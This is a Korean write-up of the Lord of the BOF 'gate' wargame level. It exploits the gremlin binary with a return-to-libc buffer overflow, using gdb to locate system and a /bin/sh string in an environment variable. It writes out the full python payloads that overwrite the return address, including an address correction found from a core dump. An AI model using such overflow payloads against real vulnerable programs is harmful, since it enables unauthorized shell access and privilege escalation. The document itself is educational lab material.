# LOB - gate (RTL)

### /bin/bash2 는 보호가 되어있으므로 /bin/sh를 사용해야한다. - 없으면 export BBB="/bin/sh"   이런 명령어로 환경변수 추가하고 시작

- tmp 디렉터리로 가서 gdb로 gremlin을 본다.
- system 함수와 /bin/sh의 주소만 알면된다.

![1568134864528](https://user-images.githubusercontent.com/52530785/64917451-90d93e00-d7cb-11e9-8fff-dd5d364d7fec.png)

main 함수에 breakpoint를 걸고 실행 후, system의 주소를 출력한다.

```ㅊ
b *main
r
p system
```

![1568133491885](https://user-images.githubusercontent.com/52530785/64917466-933b9800-d7cb-11e9-899e-35f219492cf7.png)



libc가 보인다.(libc는 무조건 있다.) 이 안에는 system이 있고, system에는 /bin/sh 가 있다.



우리는 이 system 함수 주소와 /bin/sh 의 주소를 사용하면 된다.

![1568133593933](https://user-images.githubusercontent.com/52530785/64917467-933b9800-d7cb-11e9-8714-7a558d067d88.png)



쭉 찾아보는데 잘 보이지 않으므로, 환경변수에 추가했다.

![1568133643992](https://user-images.githubusercontent.com/52530785/64917468-933b9800-d7cb-11e9-8898-f8f29530b574.png)



다시 gdb를 들어간다.

```ㅊ
b *main
r aaaa	--> gremlin은 argv 인자가 필요하므로, argv 인자를 줌
si
ni
x/2ws $ebp
```

![1568133876050](https://user-images.githubusercontent.com/52530785/64917469-933b9800-d7cb-11e9-96df-9414d119c853.png)

![1568133895079](https://user-images.githubusercontent.com/52530785/64917470-93d42e80-d7cb-11e9-810a-1fb4ac172688.png)



- 이 중 x/2ws $ebp 명령어를 통해 나오는 값들은 

![1568134829679](https://user-images.githubusercontent.com/52530785/64917450-90d93e00-d7cb-11e9-945c-6ff9cd344bf9.png)

이렇게 이다.



env의 값들을 보면

```c
x/10wx 0xbffffb70
```

![1568134224079](https://user-images.githubusercontent.com/52530785/64917471-93d42e80-d7cb-11e9-8cb4-18a05c30d47d.png)

이렇게 쭉 있는데 그 중 첫번째부터 쭉 보았다.



```ㅊ
x/100s 0xbffffc71
```

![1568134351208](https://user-images.githubusercontent.com/52530785/64917472-93d42e80-d7cb-11e9-8af4-c0dbf4a0914a.png)

0xbffffc84에 내가 환경변수에 추가한 BINSH=/bin/sh 가 있다.



```ㅊ
x/s 0xbffffc84
```

![1568134418033](https://user-images.githubusercontent.com/52530785/64917473-946cc500-d7cb-11e9-80e8-c9ea185b4822.png)



근데 내가 필요한 부분은 /bin/sh 이므로

BINSH= 의 6바이트만큼 더해서 /bin/sh만 나타낸다.

![1568134471342](https://user-images.githubusercontent.com/52530785/64917474-946cc500-d7cb-11e9-8a8c-1437038ef845.png)



---

그러면 지금 system 함수의 주소인 0x40058ae0과

![1568134540288](https://user-images.githubusercontent.com/52530785/64917449-90d93e00-d7cb-11e9-966e-57dc842a72ba.png)

/bin/sh의 주소인 0xbffffc84+6 을 구했다.

![1568134471342-1568528020936](https://user-images.githubusercontent.com/52530785/64917448-90d93e00-d7cb-11e9-89d3-c9383e137739.png)

0xbffffc8a



그럼 gremlin.c 는

![1568135017123](https://user-images.githubusercontent.com/52530785/64917452-9171d480-d7cb-11e9-85ea-6de371ff3fd8.png)

이므로

buffer와 SFP 크기의 합인 260바이트를 dummy로 채우고,

main 함수의 RET 을 system 함수의 주소

system 함수의 RET을 dummy

그리고 argv에 /bin/sh 문자열의 주소를 넣으면 된다.





----------------

system 함수 주소 : 0x40058ae0

/bin/sh 문자열의 주소 : 0xbffffc8a

```c
./gremlin `python -c 'print "a"*260+"\xe0\x8a\x05\x40"+"\x61\x61\x61\x61"+"\x8a\xfc\xff\xbf"'`
```

![1568136000398](https://user-images.githubusercontent.com/52530785/64917453-9171d480-d7cb-11e9-985a-fb24185d009e.png)

segmentation fault 가 뜬다.



다시 gdb를 들어가서 보면

```ㅊ
gdb gremlin
b *main
r `python -c 'print "a"*260+"\xe0\x8a\x05\x40"+"\x61\x61\x61\x61"+"\x8a\xfc\xff\xbf"'`
si	// 기본 gdb가 이상해서 main에서 ni를 하면 main이 끝나므로 si 사용
dias main
```

![1568136057091](https://user-images.githubusercontent.com/52530785/64917454-9171d480-d7cb-11e9-9d78-1b6d457da59c.png)

![1568136077828](https://user-images.githubusercontent.com/52530785/64917455-9171d480-d7cb-11e9-90d4-cfdf5f81c1d0.png)



```ㅊ
disas main	에서 ret의 주소에 breakpoint 를 건다.
```

![1568136287130](https://user-images.githubusercontent.com/52530785/64917457-920a6b00-d7cb-11e9-9235-75af6c242078.png)



```ㅊ
c  //continue 하면 진행된다.
```

![1568136305429](https://user-images.githubusercontent.com/52530785/64917458-920a6b00-d7cb-11e9-9363-177fe8a36741.png)



여기서 esp를 확인해본다.

```c
x/wx $esp	//system의 주소와 똑같다.
```

![1568136410468](https://user-images.githubusercontent.com/52530785/64917459-920a6b00-d7cb-11e9-8f0a-9de5e66ffaa3.png)



엔터를 계속 치면서 보면

![1568136493255](https://user-images.githubusercontent.com/52530785/64917460-920a6b00-d7cb-11e9-9dde-1daa1fc62da6.png)



- 내가 main의 RET에 넣어두었던 system의 주소
- system 함수의 RET에 넣어둔 dummy 값인 aaaa
- /bin/sh 문자열의 주소인 0xbffffc8a 가 들어가 있다.
- c 를 통해 continue 하면 쉘이 뜬다.





### 근데 안되는 이유는

- gdb를 하면 환경변수 위치가 조금씩 달라지기 때문이다.



core를 들어가서 확인해본다. 

main함수의 RET에 넣어둔 system 의 주소는 stack 아래부분에 있으므로 바뀌지 않아서 그냥 두고 /bin/sh 문자열의 주소만 찾아서 바꾸면 된다.



- **위에서는 x/wx $esp 했을 때 system 의 주소가 나왔지만,**

  **core 에서 x/wx $esp 했을 때 /bin/sh 문자열의 주소가 나오는 이유는** 

  **환경변수가 gdb를 실행 할때마다 조금씩 달라지기 때문이다.**



```ㅊ
gdb -c core
x/wx $esp
x/s 0xbffffc8a	--> /bin/sh 문자열의 주소
```

![1568136774197](https://user-images.githubusercontent.com/52530785/64917461-92a30180-d7cb-11e9-8421-1035bcd972de.png)



/bin/sh가 들어가 있어야할 위치인 0xbffffc8a 에 다른 값이 들어가 있다.

이를 찾기 위해

```ㅊ
x/s 0xbffffc8a-0x100	명령어를 사용했다.
```

![1568136992992](https://user-images.githubusercontent.com/52530785/64917462-92a30180-d7cb-11e9-9336-5ceda1b3d53d.png)



BINSH=/bin/sh 가 0xbffffc73 에 있다.

내가 필요한 부분은 /bin/sh 이므로 6바이트를 더한다.

0xbffffc79



/bin/sh 문자열의 주소를 바꿔서 하면

![1568137087557](https://user-images.githubusercontent.com/52530785/64917463-92a30180-d7cb-11e9-8486-5277b16c9cd8.png)

/sh를 찾을 수 없다고 나온다.



그러면 /bin 이 사라진거니까 4바이트를 빼서

0xbffffc75 로 바꿔준다.

```ㅊ
./gremlin `python -c 'print "a"*260+"\xe0\x8a\x05\x40\x61\x61\x61\x61"+"\x75\xfc\xff\xbf"'`
```

![1568137174300](https://user-images.githubusercontent.com/52530785/64917465-92a30180-d7cb-11e9-99f8-0a722ca95001.png)



쉘이 떴다.
